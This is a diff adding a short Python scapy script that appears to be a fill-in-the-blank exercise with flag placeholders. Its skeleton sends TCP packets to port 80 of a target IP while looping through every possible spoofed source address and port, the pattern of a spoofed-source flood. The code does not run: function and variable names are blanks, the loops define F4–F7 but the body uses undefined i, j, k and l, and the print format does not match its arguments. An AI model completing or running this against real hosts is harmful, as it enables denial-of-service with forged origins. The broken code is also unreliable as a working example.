@@ -1,0 +1,29 @@
+from scapy.all import *
+
+def #flag1:
+	sendp(packet)
+
+eth = #F1
+ip = #F2
+ip.dst = 'Target IP'
+tcp = #F3
+
+#Flag2 = #F1.#F2.#F3 = ?
+
+packet = eth/ip/tcp
+tcp.dport = 80
+
+m = 0
+
+for F4 in range(1, 255):
+	for F5 in range(1, 255):
+		for F6 in range(1, 255):
+			for F7 in range(1, 255):
+				for F8 in range(1, 65535):
+
+#Flag3=#F4.#F5.#F6.#F7.#F8
+					ip .src = str(i) + '.' +str(j) + '.' +str(k) + '.' +str(l) 
+					#FLAG4 = sp
+					#FLAG5
+					print('send 1 in %s and port %s' %(ip.src))
+					m = m + 1
